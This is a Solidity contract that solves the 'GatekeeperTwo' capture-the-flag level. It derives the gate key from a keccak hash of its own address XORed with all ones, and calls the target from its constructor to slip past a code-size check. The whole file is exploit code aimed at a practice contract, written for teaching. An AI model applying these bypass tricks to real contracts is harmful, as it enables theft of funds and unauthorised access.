// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoSolution {
  constructor(address _address) {
    IGatekeeperTwo target = IGatekeeperTwo(_address);
    bytes8 key;

    // solidity version 8 and above does underflow/overflow checking and the
    // (uint64(0) - 1) will surely underflow to the largest int value.
    // Using unchecked allows us to do the underflow:
    unchecked {
      key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
    }
    target.enter(key);
  }
}
